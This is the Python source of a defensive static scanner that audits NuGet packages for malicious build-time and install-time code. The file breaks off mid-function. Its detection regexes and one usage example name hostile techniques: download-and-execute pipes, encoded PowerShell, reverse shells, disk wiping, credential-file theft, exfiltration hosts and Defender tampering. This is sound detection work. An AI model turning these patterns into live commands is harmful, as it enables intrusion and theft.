#!/usr/bin/env python3
"""nuget-audit - scan NuGet packages for MALICIOUS build-time and install-time code.

Referencing a NuGet package does more than add a DLL. Every `build/`, `buildTransitive/` and
`buildMultiTargeting/` .props/.targets file in the package is imported into the consuming
project's MSBuild evaluation, so its targets, `<Exec>` commands and inline C# tasks run on
`dotnet build` - and on the design-time builds Visual Studio and Rider start the moment you
open the solution. `buildTransitive/` reaches every project that depends on you, too. Legacy
`tools/install.ps1` / `init.ps1` run inside Visual Studio's Package Manager Console.

`dotnet list package --vulnerable` only answers "does this version have a known advisory?".
This fills the gap: a deterministic (no LLM) static scan of the .nupkg's MSBuild and script
content for download-and-execute, encoded payloads, environment and credential exfiltration
(NuGet.Config feed credentials, ~/.ssh, cloud CLIs), persistence writes outside obj/bin,
droppers, reverse shells and package-republishing worms - weighted by WHEN the code runs
(a target hooked into Build/Restore/CoreCompile runs on every build; an opt-in target does
not).

Precision-tuned to near-zero false positives: what popular packages do every day (running
their own bundled compiler or code generator, copying native binaries to the output folder,
SourceLink/CI property switches, `dotnet tool restore`, compiled MSBuild task DLLs, Roslyn
analyzers) is reported as informational context and never inflates the risk score.

The package is never restored, built or executed. Remote packages are read from
api.nuget.org with HTTP range requests: only the zip directory and the text members we scan
are downloaded, never the DLLs.

Usage:
  python nuget_audit.py <PackageId>[@version] [...]    # fetch from nuget.org and scan
  python nuget_audit.py <file.nupkg|dir|file.targets>  # scan a local package / file
  python nuget_audit.py --project App.csproj           # scan every PackageReference
  python nuget_audit.py --packages-lock packages.lock.json
  python nuget_audit.py --text "<Exec Command='curl https://x | sh' />"
  add --json for machine-readable output, --verbose to print INFO context

Exit code 2 if any target is HIGH or CRITICAL (CI-friendly).
No dependencies beyond the standard library. MIT licensed.
"""
import bisect
import io
import json
import os
import posixpath
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET
import zipfile

__version__ = "0.1.0"

FLAT = os.environ.get("NUGET_AUDIT_FLAT", "https://api.nuget.org/v3-flatcontainer").rstrip("/")
MAX_FILE = 4000000      # bytes per text member; bigger is generated code - reported, not scanned
MAX_TOTAL = 24000000    # bytes of text per package
WIN = 8192              # regex window for very long lines
MAX_HITS = 20           # findings kept per signature per file
BUILD_DIRS = ("build/", "buildtransitive/", "buildmultitargeting/", "buildcrosstargeting/")
MSBUILD_EXT = (".props", ".targets", ".proj", ".tasks")
SCRIPT_EXT = (".ps1", ".psm1", ".sh", ".cmd", ".bat", ".js", ".mjs", ".cjs", ".py", ".csx", ".cs", ".vbs")
INSTALL_SCRIPTS = ("tools/install.ps1", "tools/init.ps1", "tools/uninstall.ps1")
BINARY_EXT = (".dll", ".exe", ".so", ".dylib", ".node", ".wasm")

# ---------------------------------------------------------------------------
# Shared building blocks
# ---------------------------------------------------------------------------
EXFIL_HOST = (
    r"(?:discord(?:app)?\.com/api/webhooks/|api\.telegram\.org/bot|hooks\.slack\.com/services/|"
    r"pastebin\.com/(?:raw/|api/)|paste\.ee/|hastebin\.com|ghostbin\.|transfer\.sh\b|"
    r"\bfile\.io\b|0x0\.st\b|webhook\.site\b|requestbin\.(?:com|net|io)\b|requestb\.in\b|"
    r"pipedream\.net\b|\.ngrok(?:-free)?\.(?:io|app|dev)\b|\.trycloudflare\.com\b|\.serveo\.net\b|"
    r"\.loca\.lt\b|\.interact\.sh\b|\boast\.(?:pro|live|site|online|fun|me)\b|\.burpcollaborator\.net\b|"
    r"\bcanarytokens\.com\b|\.dnslog\.cn\b|\bceye\.io\b|\bipinfo\.io/json|\bip-api\.com/json)"
)
RAW_IP_URL = (r"https?://(?!(?:127\.|0\.0\.0\.0|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|169\.254\.|"
              r"192\.0\.2\.|198\.51\.100\.|203\.0\.113\.))\d{1,3}(?:\.\d{1,3}){3}")
# a network SEND (or fetch) primitive - shell, PowerShell, C#, JS, Python
NET_SEND = (
    r"\b(?:curl|wget)(?:\.exe)?\s|\bInvoke-(?:WebRequest|RestMethod)\b|\b(?:iwr|irm)\s|"
    r"Net\.WebClient|\bWebClient\s*\(|\bHttpClient\s*\(|WebRequest\.Create|HttpWebRequest|"
    r"\.(?:DownloadString|DownloadData|DownloadFile|UploadString|UploadData|UploadValues|UploadFile)\w*\s*\(|"
    r"\.(?:PostAsync|PutAsync|SendAsync|GetStringAsync|GetByteArrayAsync|GetAsync)\s*\(|"
    r"\bTcpClient\s*\(|\bSocket\s*\(|<DownloadFile\b|Start-BitsTransfer|bitsadmin|certutil[^\n]{0,40}-urlcache|"
    r"\bfetch\s*\(|https?\.(?:request|get)\s*\(|XMLHttpRequest|urllib\.request|requests\.(?:get|post)|"
    r"\bnslookup\s|Resolve-DnsName"
)
CHECKSUM = (r"(?:VerifyFileHash|Get-FileHash|sha256sum|shasum|SHA256|Sha256|sha512|SHA512|"
            r"ComputeHash|checksum|Checksum|ExpectedHash|integrity)")
CI_VARS = (r"\b(?:CI|TF_BUILD|GITHUB_ACTIONS|GITLAB_CI|BUILD_BUILDID|BUILD_ID|JENKINS_URL|JENKINS_HOME|"
           r"TEAMCITY_VERSION|APPVEYOR|TRAVIS|CIRCLECI|BITBUCKET_BUILD_NUMBER|SYSTEM_TEAMFOUNDATIONCOLLECTIONURI|"
           r"BUILDKITE|CODEBUILD_BUILD_ID|DRONE)\b")
CRED_PATHS = (
    r"(?:NuGet[\\/]{1,2}NuGet\.Config|packageSourceCredentials|\.nuget[\\/]{1,2}NuGet[\\/]|"
    r"\.ssh[\\/]{1,2}(?:id_\w+|authorized_keys|known_hosts)|\.aws[\\/]{1,2}credentials|\.azure[\\/](?:accessTokens|msal_token_cache)|"
    r"\.config[\\/]gcloud|\.docker[\\/]config\.json|\.git-credentials|\.npmrc\b|\.pypirc\b|"
    r"Login Data\b|Local State\b|Cookies\b[^\n]{0,40}(?:Chrome|Edge|Brave)|(?:Chrome|Edge|Brave)[^\n]{0,60}Cookies\b|"
    r"wallet\.dat|Exodus[\\/]|Electrum[\\/]wallets|\\Microsoft\\Credentials|cmdkey\s+/list|Get-StoredCredential|"
    r"\bvaultcmd\b|\.kube[\\/]config|\.netrc\b)"
)

PATTERNS = {
    "critical": [
        {"id": "download_execute", "name": "Download & Execute",
         "desc": "Fetches remote code and pipes it straight into a shell / Invoke-Expression",
         "regexes": [
             r"\b(?:curl|wget)(?:\.exe)?\s[^\n|;]{0,300}\|\s*(?:sudo\s+)?(?:sh|bash|zsh|python3?|perl|node|pwsh|powershell)\b",
             r"(?:sh|bash|python3?)\s*<\s*\(\s*(?:curl|wget)",
             r"\b(?:iex|Invoke-Expression)\b\s*[\(\$]?\s*[\(\[]*\s*(?:\(?\s*New-Object\s+(?:System\.)?Net\.WebClient\s*\)?\s*\.\s*DownloadString|iwr\b|irm\b|Invoke-WebRequest|Invoke-RestMethod|\[?(?:System\.)?Net\.WebClient)",
             r"(?:DownloadString\s*\([^)\n]{0,300}\)|\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b[^|\n]{0,300})\|\s*(?:iex|Invoke-Expression)\b",
             r"\[ScriptBlock\]::Create\s*\(\s*\(?\s*(?:\(?\s*New-Object\s+(?:System\.)?Net\.WebClient|iwr\b|irm\b|Invoke-WebRequest|Invoke-RestMethod)",
             r"\bmshta(?:\.exe)?\s+[\"']?(?:https?|vbscript|javascript):",
             r"\bregsvr32(?:\.exe)?\b[^\n]{0,80}/i:\s*[\"']?https?://",
         ]},
        {"id": "encoded_exec", "name": "Encoded-then-Executed Payload",
         "desc": "Runs a base64 / -EncodedCommand blob, or loads a decoded assembly into memory",
         "regexes": [
             r"\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,80}\s-(?:e|ec|en|enc|enco|encodedcommand)\s+[\"']?[A-Za-z0-9+/=]{40,}",
             r"(?:iex|Invoke-Expression)\b[^\n]{0,80}FromBase64String",
             r"FromBase64String[^\n]{0,200}(?:\|\s*(?:iex|Invoke-Expression)|\)\s*\)\s*\|\s*iex)",
             r"Assembly\]?::Load\s*\(\s*(?:\[(?:System\.)?Convert\]::|Convert\.)FromBase64String",
             r"Assembly\.Load\s*\(\s*Convert\.FromBase64String",
             r"\beval\s*\(\s*(?:atob|Buffer\.from)\s*\(",
             r"exec\s*\(\s*(?:base64\.b64decode|zlib\.decompress|marshal\.loads)",
         ]},
        {"id": "reverse_shell", "name": "Reverse Shell",
         "desc": "Spawns an interactive shell bound to a network socket",
         "regexes": [
             r"/dev/tcp/[\w.\-]{1,253}/\d{1,5}",
             r"bash\s+-i\s*>&",
             r"\bnc(?:at)?(?:\.exe)?\s+(?:-\w{1,10}\s+){0,4}-e\s+(?:/bin/(?:ba)?sh|cmd(?:\.exe)?|powershell)",
             r"New-Object\s+(?:System\.)?Net\.Sockets\.TCPClient[^\n]{0,400}(?:iex|Invoke-Expression)",
             r"TcpClient\s*\([^\n]{0,400}(?:StandardInput|RedirectStandardInput)",
         ]},
        {"id": "destructive", "name": "Destructive Payload",
         "desc": "Wipes the home directory / drive",
         "regexes": [
             r"\brm\s+-[a-zA-Z]{0,4}r[a-zA-Z]{0,4}\s+(?:--no-preserve-root\s+)?(?:~|\$HOME|\$\(HOME\)|/)(?:\s|[\"'`;&]|$)",
             r"Remove-Item\s+[^\n]{0,60}(?:\$env:USERPROFILE|\$HOME|~|C:\\\\?)[\"']?\s+[^\n]{0,30}-Recurse[^\n]{0,30}-Force",
             r"\b(?:rd|rmdir)\s+/s\s+/q\s+(?:%USERPROFILE%|C:\\)(?:\s|\"|$)",
             r"\bformat(?:\.com)?\s+[c-z]:\s+/[qy]",
             r"vssadmin(?:\.exe)?\s+delete\s+shadows",
         ]},
        {"id": "worm_propagation", "name": "Self-Propagation (Worm)",
         "desc": "Publishes packages with a harvested API key from inside a build or install hook",
         "regexes": [
             r"\b(?:dotnet\s+nuget|nuget(?:\.exe)?)\s+push\b[^\n]{0,300}(?:-k\b|--api-key|-ApiKey)",
             r"\bnpm\s+publish\b[^\n]{0,120}(?:--//|_authToken|NPM_TOKEN)",
             r"trufflehog[^\n]{0,80}(?:filesystem|github|--json)",
         ]},
    ],
    "high": [
        {"id": "exfil_host", "name": "Exfiltration Endpoint",
         "desc": "Hard-codes a webhook / paste / tunnel / OAST collector host",
         "regexes": [EXFIL_HOST]},
        {"id": "credential_read", "name": "Credential Store Access",
         "desc": "Reads NuGet feed credentials, SSH keys, cloud CLI tokens, browser or wallet stores",
         "regexes": [CRED_PATHS]},
        {"id": "env_dump", "name": "Environment Dump",
         "desc": "Serialises the whole environment (every CI secret) - exfil when a network sink is present",
         "regexes": [
             r"Environment\.GetEnvironmentVariables\s*\(\s*\)",
             r"\b(?:Get-ChildItem|gci|dir|ls)\s+env:(?:\s|\||\)|$)",
             r"\[(?:System\.)?Environment\]::GetEnvironmentVariables\s*\(",
             r"\bprintenv\b(?![ \t]+\w)",
             r"(?:^|[;&|(\s\"'])env\s*(?:\||>)",
             r"\bset\s*>\s*\S",
             r"JSON\.stringify\s*\(\s*process\.env\s*[,)]",
             r"dict\s*\(\s*os\.environ\s*\)",
         ]},
        {"id": "persistence_write", "name": "Persistence / Out-of-Tree Write",
         "desc": "Writes shell rc files, autostart, scheduled tasks, Run keys, NuGet.Config or MSBuild ImportBefore hooks",
         "regexes": [
             r"(?:\.bashrc|\.zshrc|\.bash_profile|\.zprofile|authorized_keys|LaunchAgents|LaunchDaemons|\.config/autostart|systemd/user)",
             r"Start Menu[\\/]Programs[\\/]Startup|\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
             r"CurrentVersion\\Run(?:Once)?\b",
             r"\bschtasks(?:\.exe)?\s+/create\b|Register-ScheduledTask\b|New-ScheduledTaskAction\b",
             r"\bcrontab\s+-(?!l)\w",
             r"MSBuildUserExtensionsPath|[\\/]ImportBefore[\\/]|[\\/]ImportAfter[\\/]",
             r"Microsoft\.Common\.targets[\\/]",
         ]},
        {"id": "defender_tamper", "name": "Security Tool Tampering",
         "desc": "Disables or blinds Defender / adds exclusions / turns off SmartScreen or Gatekeeper",
         "regexes": [
             r"\bSet-MpPreference\b[^\n]{0,120}-Disable\w*\s+\$?(?:true|1)\b",
             r"\bAdd-MpPreference\b[^\n]{0,80}-Exclusion(?:Path|Process|Extension)",
             r"\bspctl\s+--master-disable",
             r"\bcsrutil\s+disable",
             r"DisableAntiSpyware|DisableRealtimeMonitoring",
         ]},
        {"id": "dns_exfil", "name": "DNS Exfiltration",
         "desc": "Encodes host / user / env data into a DNS lookup",
         "regexes": [
             r"(?:^|[;&|(\"'`]|\s)(?:nslookup(?:\.exe)?|dig|Resolve-DnsName)\s+(?:-\w+\s+){0,3}[^\s\n]{0,80}(?:\$env:\w+|%(?:USERNAME|COMPUTERNAME|USERDOMAIN|USERPROFILE)%|\$\((?:whoami|hostname)|`(?:whoami|hostname)`|\$\((?:USERNAME|COMPUTERNAME|USER)\)|\$(?:USER|HOSTNAME)\b)",
             r"Dns\.(?:GetHostEntry|GetHostAddresses|Resolve)\w*\s*\([^\n]{0,120}(?:Environment\.(?:UserName|MachineName)|GetEnvironmentVariable)",
         ]},
        {"id": "tls_bypass", "name": "TLS Verification Disabled",
         "desc": "Turns certificate validation off for every connection in the process",
         "regexes": [
             r"ServerCertificateValidationCallback\s*=\s*(?:\(?[^\n]{0,60}\)?\s*=>\s*true|delegate[^\n]{0,80}return\s+true)",
             r"ServerCertificateCustomValidationCallback\s*=\s*(?:HttpClientHandler\.)?DangerousAcceptAnyServerCertificateValidator",
             r"\bcurl(?:\.exe)?\s[^\n]{0,200}(?:\s-k\b|--insecure)",
             r"\bwget\s[^\n]{0,200}--no-check-certificate",
             r"SkipCertificateCheck",
         ]},
    ],
    "medium": [
        {"id": "raw_ip_url", "name": "Raw-IP Endpoint",
         "desc": "Talks to a hard-coded public IP address instead of a hostname",
         "regexes": [RAW_IP_URL]},
        {"id": "plaintext_download", "name": "Plaintext Download",
         "desc": "Downloads over http:// (no TLS) - anyone on the path can swap the payload",
         "regexes": [
             r"\b(?:curl|wget)(?:\.exe)?\s[^\n]{0,200}http://(?!localhost|127\.0\.0\.1|\$)",
             r"\b(?:Invoke-WebRequest|iwr|irm|Invoke-RestMethod|Start-BitsTransfer)\b[^\n]{0,200}http://(?!localhost|127\.0\.0\.1)",
             r"\.Download(?:File|String|Data)\w*\s*\(\s*[\"']http://(?!localhost|127\.0\.0\.1)",
             r"<DownloadFile\b[^>]{0,400}SourceUrl\s*=\s*\"http://(?!localhost|127\.0\.0\.1)",
         ]},
        {"id": "file_host_binary", "name": "Payload from a File Host",
         "desc": "Downloads from Discord CDN / Dropbox / Google Drive / MEGA / anonymous file hosts",
         "regexes": [
             r"cdn\.discordapp\.com/attachments/|media\.discordapp\.net/attachments/",
             r"dl\.dropboxusercontent\.com/|dropbox\.com/s/[^\n]{0,80}\?dl=1",
             r"drive\.google\.com/uc\?[^\n]{0,40}export=download",
             r"\bmega\.nz/(?:file|#!)",
             r"\b(?:anonfiles|gofile|catbox\.moe|files\.catbox|bashupload|temp\.sh|uguu\.se)\b",
         ]},
        {"id": "obfuscation", "name": "Obfuscated Command",
         "desc": "Character-code / string-reversal / long escaped blobs feeding an execution sink",
         "regexes": [
             r"\[char\[\]\]\s*\(\s*(?:\d{2,3}\s*,\s*){20,}",
             r"-join\s*\(\s*\[char\[\]\][^\n]{0,40}\[-1\.\.",
             r"(?:\\x[0-9a-fA-F]{2}){40,}",
             r"String\.fromCharCode\s*\((?:\s*\d{2,3}\s*,){20,}",
         ]},
    ],
    # capabilities: reported, never scored
    "info": [
        {"id": "network", "name": "Network Access", "desc": "Uses the network", "regexes": [NET_SEND]},
        {"id": "process_spawn", "name": "Process Spawn", "desc": "Starts another process",
         "regexes": [r"Process\.Start\s*\(|ProcessStartInfo|Start-Process\b|child_process|subprocess\.|os\.system\s*\(|Shell\.Application"]},
        {"id": "package_install", "name": "Package-Manager Install",
         "desc": "Restores / installs other packages or tools (npm, pip, dotnet tool, choco, winget)",
         "regexes": [r"\b(?:npm|pnpm|yarn)(?:\.cmd)?\s+(?:install|ci|i|add)\b|\bpip3?\s+install\b|\bdotnet\s+tool\s+(?:restore|install)\b|\b(?:choco|winget|brew|apt-get|apt)\s+install\b|\bInstall-Module\b|\bInstall-Package\b"]},
        {"id": "env_read", "name": "Environment Read", "desc": "Reads environment variables",
         "regexes": [r"GetEnvironmentVariable\s*\(|\$env:\w+|process\.env\.|os\.environ\b|%\w+%"]},
        {"id": "base64_decode", "name": "Base64 Decode", "desc": "Decodes base64 (not executed)",
         "regexes": [r"FromBase64String|base64\s+(?:-d|--decode)|\batob\s*\(|b64decode"]},
        {"id": "registry_write", "name": "Registry Write", "desc": "Writes registry values",
         "regexes": [r"\b(?:Set-ItemProperty|New-ItemProperty)\b[^\n]{0,40}(?:HKCU|HKLM|Registry::)|Registry\.(?:CurrentUser|LocalMachine)\.(?:CreateSubKey|OpenSubKey)[^\n]{0,80}true|\breg(?:\.exe)?\s+add\b"]},
        {"id": "execpolicy", "name": "ExecutionPolicy Bypass (process)", "desc": "Runs PowerShell with -ExecutionPolicy Bypass",
         "regexes": [r"-ExecutionPolicy\s+(?:Bypass|Unrestricted)|Set-ExecutionPolicy\b"]},
        {"id": "ide_automation", "name": "Visual Studio DTE Automation",
         "desc": "install.ps1 manipulates the project via the DTE object model (legacy packages.config)",
         "regexes": [r"\$project\.(?:Object|ProjectItems|Properties)|\$dte\.|\$DTE\.|EnvDTE"]},
        {"id": "opens_url", "name": "Opens a Web Page", "desc": "Opens a URL in the IDE/browser (readme / release notes)",
         "regexes": [r"ItemOperations\.Navigate|Start-Process\s+[\"']?https?://|\bstart\s+https?://"]},
    ],
}

SEVERITY_SCORE = {"critical": 25, "high": 15, "medium": 8, "low": 3, "info": 0}
SEV_ORDER = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0, "SAFE": 0}
_COMPILED = [(sev, pg, re.compile(rx, re.IGNORECASE if pg["id"] not in ("obfuscation",) else 0))
             for sev, groups in PATTERNS.items() for pg in groups for rx in pg["regexes"]]
NET_RE = re.compile(NET_SEND, re.IGNORECASE)
EXFIL_RE = re.compile(EXFIL_HOST, re.IGNORECASE)
RAWIP_RE = re.compile(RAW_IP_URL)
CHECKSUM_RE = re.compile(CHECKSUM)
CI_RE = re.compile(r"\$\(\s*" + CI_VARS + r"\s*\)|\$env:" + CI_VARS + r"|%" + CI_VARS + "%")
CHMOD_RE = re.compile(r"\bchmod\s+(?:\+x|[0-7]*[1357][0-7]{0,2})\b|\bUnblock-File\b")
DL_TO_FILE_RE = re.compile(
    r"<DownloadFile\b|\b(?:curl|wget)(?:\.exe)?\s[^\n]{0,300}(?:\s-o\s|\s-O\b|--output\b)|"
    r"\b(?:Invoke-WebRequest|iwr)\b[^\n]{0,300}-OutFile\b|\.DownloadFile\w*\s*\(|Start-BitsTransfer|"
    r"certutil[^\n]{0,40}-urlcache|bitsadmin[^\n]{0,40}/transfer", re.IGNORECASE)
EXEC_TEMP_RE = re.compile(
    r"(?:Start-Process|Process\.Start|&\s*|\bcall\s+|\bstart\s+\"?\"?\s*)[^\n]{0,60}?(?:\$env:TEMP|\$env:TMP|\$env:APPDATA|\$env:LOCALAPPDATA|\$env:PUBLIC|%TEMP%|%TMP%|%APPDATA%|%LOCALAPPDATA%|"
    r"GetTempPath|\$\(Temp\)|/tmp/|\$TMPDIR|\$\(IntermediateOutputPath\)[^\n]{0,40}\.exe)", re.IGNORECASE)
SCRIPT_EXT_RE = re.compile(r"\.(?:ps1|psm1|sh|cmd|bat|js|mjs|cjs|py|csx|vbs)\b", re.I)
SCRIPT_REF_RE = re.compile(r"([\w.\-]{1,120}\.(?:ps1|psm1|sh|cmd|bat|js|mjs|cjs|py|csx|vbs))\b", re.I)
DL_NEEDLES = ("download", "curl", "wget", "iwr", "invoke-webrequest", "bits", "certutil")
LINE_ONCE = {"network", "process_spawn", "env_read", "base64_decode", "registry_write", "execpolicy",
             "ide_automation", "opens_url", "package_install"}
# standard targets: a package target that hooks onto one of these runs on every build
STD_TARGETS = {
    "build", "beforebuild", "afterbuild", "corebuild", "compile", "corecompile", "beforecompile", "aftercompile",
    "prepareforbuild", "resolvereferences", "resolveassemblyreferences", "resolvepackageassets",
    "restore", "_generaterestoregraph", "collectpackagereferences", "_collectpackagereferences",
    "generatebuilddependencyfile", "copyfilestooutputdirectory", "prepareresources", "preparefornrun",
    "getcopytooutputdirectoryitems", "_copyfilesmarkedcopylocal", "assignprojectconfiguration",
    "resolveprojectreferences", "generatetargetframeworkmonikerattribute", "coregenerateassemblyinfo",
    "generateassemblyinfo", "_checkforinvalidconfigurationandplatform", "beforeresolvereferences",
    "afterresolvereferences", "publish", "pack", "rebuild", "clean", "dispatchtoinnerbuilds",
    "_computepackagereferencepath", "resolvelockedreferences", "markupcompilepass1", "preparerefassemblies",
    "_handlepackagefileconflicts", "resolvetargetingpackassets", "processframeworkreferences",
}


def _item(sev, pid, name, desc, path, n, matched="", ctx=""):
    return {"severity": sev, "id": pid, "name": name, "description": desc, "file": path,
            "line": n, "matched": (matched or "")[:120], "context": (ctx or "").strip()[:200]}


class _Lines:
    """Offset -> line number with bisect (never text.count per match)."""

    def __init__(self, text):
        self.nl = [i for i, c in enumerate(text) if c == "\n"] if len(text) < 200000 else \
            [m.start() for m in re.finditer("\n", text)]

    def line(self, off):
        return bisect.bisect_right(self.nl, off) + 1 if off >= 0 else 0


def _windows(line):
    if len(line) <= WIN:
        yield line
        return
    step = WIN - 1024
    for i in range(0, len(line), step):
        yield line[i:i + WIN]


# ---------------------------------------------------------------------------
# Fragment scanning: a fragment is executable text with a known run-context
# ---------------------------------------------------------------------------
# ctx kinds:
#   build-auto   : MSBuild code in a target hooked into the build (runs on every build / design-time build)
#   build-optin  : MSBuild code in a target only run when explicitly invoked or behind an opt-in property
#   build-eval   : MSBuild property functions evaluated whenever the project is loaded
#   install      : tools/install.ps1 / init.ps1 (Visual Studio Package Manager Console)
#   uninstall    : tools/uninstall.ps1 (cleanup)
#   aux          : text that ships in the package but nothing we can see runs it
ESCALATE = {"build-auto", "build-eval", "install"}
SCORED_CTX = {"build-auto", "build-optin", "build-eval", "install", "uninstall"}


def _blank(s):
    return re.sub(r"[^\n]", " ", s)


def _strip_block(text, start, end):
    """Blank out start...end block comments with str.find - linear time (a regex like
    /\*.*?\*/ rescans to EOF for every unclosed opener in minified JS). An unclosed opener
    is left alone."""
    out, i = [], 0
    while True:
        a = text.find(start, i)
        if a < 0:
            break
        z = text.find(end, a + len(start))
        if z < 0:
            break
        z += len(end)
        out.append(text[i:a])
        out.append(_blank(text[a:z]))
        i = z
    out.append(text[i:])
    return "".join(out)


XML_COMMENT = ("<!--", "-->")
PS_LINE_COMMENT = re.compile(r"(?<![`'\"\w$])#(?!requires)[^\n]*", re.M)
CLIKE_LINE_COMMENT = re.compile(r"(?<![:\"'\w\\/])//[^\n]*", re.M)
SH_COMMENT = re.compile(r"(?m)^\s*#(?!!)[^\n]*")
BAT_COMMENT = re.compile(r"(?mi)^\s*(?:@?rem\b|::)[^\n]*")


def _strip_comments(text, comment):
    if isinstance(comment, tuple):
        return _strip_block(text, *comment)
    return comment.sub(lambda m: _blank(m.group(0)), text)


def _decomment(text, path):
    p = path.lower()
    if p.endswith((".ps1", ".psm1")):
        return _strip_comments(_strip_block(text, "<#", "#>"), PS_LINE_COMMENT)
    if p.endswith((".cs", ".csx", ".js", ".mjs", ".cjs")):
        return _strip_comments(_strip_block(text, "/*", "*/"), CLIKE_LINE_COMMENT)
    if p.endswith((".sh", ".py")):
        return _strip_comments(text, SH_COMMENT)
    if p.endswith((".cmd", ".bat")):
        return _strip_comments(text, BAT_COMMENT)
    return text


NEEDLES = {
    "download_execute": ("curl", "wget", "iex", "invoke-expression", "scriptblock", "mshta", "regsvr32"),
    "encoded_exec": ("powershell", "pwsh", "frombase64", "atob", "buffer.from", "b64decode", "zlib", "marshal"),
    "reverse_shell": ("/dev/tcp", "bash", "nc ", "ncat", "nc.exe", "tcpclient"),
    "destructive": ("rm ", "remove-item", "rd ", "rmdir", "format", "vssadmin"),
    "worm_propagation": ("push", "publish", "trufflehog"),
    "exfil_host": ("discord", "telegram", "slack", "paste", "hastebin", "ghostbin", "transfer.sh", "file.io",
                   "0x0.st", "webhook.site", "requestb", "pipedream", "ngrok", "trycloudflare", "serveo", "loca.lt",
                   "interact.sh", "oast", "burpcollaborator", "canarytokens", "dnslog", "ceye", "ipinfo", "ip-api"),
    "credential_read": ("nuget.config", "packagesourcecredentials", ".nuget", ".ssh", ".aws", ".azure", "gcloud",
                        ".docker", ".git-credentials", ".npmrc", ".pypirc", "login data", "local state", "cookies",
                        "wallet.dat", "exodus", "electrum", "credentials", "cmdkey", "storedcredential", "vaultcmd",
                        ".kube", ".netrc"),
    "env_dump": ("env", "set"),
    "persistence_write": ("bashrc", "zshrc", "bash_profile", "zprofile", "authorized_keys", "launchagents",
                          "launchdaemons", "autostart", "systemd", "startup", "currentversion", "schtasks",
                          "scheduledtask", "crontab", "msbuilduserextensionspath", "importbefore", "importafter",
                          "microsoft.common.targets"),
    "defender_tamper": ("mppreference", "spctl", "csrutil", "disableantispyware", "disablerealtimemonitoring"),
    "dns_exfil": ("nslookup", "dig ", "resolve-dnsname", "dns."),
    "tls_bypass": ("certificatevalidationcallback", "dangerousacceptany", "curl", "wget", "skipcertificatecheck"),
    "raw_ip_url": ("http",),
    "plaintext_download": ("http://",),
    "file_host_binary": ("discordapp", "dropbox", "drive.google", "mega.nz", "anonfiles", "gofile", "catbox",
                         "bashupload", "temp.sh", "uguu"),
    "obfuscation": ("[char[]]", "\\x", "fromcharcode"),
    "network": ("curl", "wget", "invoke-webrequest", "invoke-restmethod", "iwr", "irm", "webclient", "httpclient",
                "webrequest", "download", "upload", "postasync", "putasync", "sendasync", "getstringasync",
                "getbytearrayasync", "getasync", "tcpclient", "socket", "bitstransfer", "bitsadmin", "certutil",
                "fetch", "http", "xmlhttprequest", "urllib", "requests.", "nslookup", "resolve-dnsname"),
    "process_spawn": ("process.start", "processstartinfo", "start-process", "child_process", "subprocess",
                      "os.system", "shell.application"),
    "package_install": ("npm", "pnpm", "yarn", "pip", "dotnet tool", "choco", "winget", "brew", "apt",
                        "install-module", "install-package"),
    "env_read": ("getenvironmentvariable", "$env:", "process.env", "os.environ", "%"),
    "base64_decode": ("frombase64", "base64", "atob", "b64decode"),
    "registry_write": ("itemproperty", "registry.", "reg"),
    "execpolicy": ("executionpolicy",),
    "ide_automation": ("$project.", "$dte.", "envdte"),
    "opens_url": ("navigate", "start-process", "start http"),
}


_ALL_NEEDLES = sorted({x for v in NEEDLES.values() for x in v})


def _active_ids(lower_text):
    """pattern ids whose literal needles occur in lower_text: each distinct needle is
    searched once (C substring search), so a long line costs ~|needles| passes, not
    |needles| x |patterns|."""
    present = {x for x in _ALL_NEEDLES if x in lower_text}
    return {pid for pid, nd in NEEDLES.items() if any(x in present for x in nd)}


AUX_IDS = frozenset(("exfil_host", "reverse_shell", "encoded_exec", "worm_propagation"))


def _scan_fragment(code, path, base_line, ctx, local, seen, ci_gated=False, only_ids=None):
    """Regex pass over one fragment. base_line: line of the fragment's first line in its file.
    Literal needles are located once per fragment; only signatures whose needles occur run,
    each as one finditer over the fragment (every quantifier is bounded, so this is linear),
    and offsets map to lines with bisect."""
    if not code.strip():
        return
    ids = _active_ids(code.lower())
    lines = None
    for sev, pg, rx in _COMPILED:
        pid = pg["id"]
        if (pid in NEEDLES and pid not in ids) or (only_ids is not None and pid not in only_ids):
            continue
        if (pid, path, 0) in seen:
            continue
        hits = 0
        for m in rx.finditer(code):
            if lines is None:
                lines = _Lines(code)
            ln = lines.line(m.start())
            n = base_line + ln - 1
            key = (pid, path, n)
            if key in seen:
                continue
            seen.add(key)
            ls = code.rfind("\n", 0, m.start()) + 1
            le = code.find("\n", m.end())
            le = len(code) if le < 0 else le
            ctxt = code[ls:le] if le - ls <= 400 else code[max(ls, m.start() - 150):min(le, m.end() + 150)]
            f = _item(sev.upper(), pid, pg["name"], pg["desc"], path, n, m.group(0), ctxt)
            f["ctx"] = ctx
            if ci_gated:
                f["ci_gated"] = True
            local.append(f)
            hits += 1
            if pid in LINE_ONCE:
                seen.add((pid, path, 0))
                break
            if hits >= MAX_HITS:
                break


# ---------------------------------------------------------------------------
# MSBuild model
# ---------------------------------------------------------------------------
def _local(tag):
    return tag.rsplit("}", 1)[-1] if isinstance(tag, str) else ""


def _split_targets(v):
    return [t.strip().lower() for t in re.split(r"[;\s]+", v or "") if t.strip() and "$(" not in t]


def _refs_in(v):
    return [t.lower() for t in re.findall(r"\$\(\s*(\w+)\s*\)", v or "")]


class MSBuildFile:
    """Parses a .props/.targets enough to know which code runs automatically."""

    def __init__(self, text, path):
        self.text = text
        self.path = path
        self.ok = True
        self.props = {}
        self.targets = {}         # lname -> element
        self.initial = set()
        self.dependson_props = {}  # *DependsOn property -> targets listed
        clean = _strip_comments(text, XML_COMMENT)
        try:
            self.root = ET.fromstring(clean.encode("utf-8", "replace"))
        except ET.ParseError:
            self.ok = False
            self.root = None
            return
        self.initial = set(_split_targets(self.root.get("InitialTargets")))
        for el in self.root.iter():
            t = _local(el.tag)
            if t == "PropertyGroup":
                for p in el:
                    name = _local(p.tag)
                    if not name:
                        continue
                    val = (p.text or "").strip()
                    self.props.setdefault(name.lower(), val)
                    if name.lower().endswith("dependson"):
                        self.dependson_props.setdefault(name.lower(), set()).update(_split_targets(val))
            elif t == "Target":
                nm = (el.get("Name") or "").strip().lower()
                if nm:
                    self.targets[nm] = el

    def expand(self, s, depth=3):
        for _ in range(depth):
            if "$(" not in s:
                break
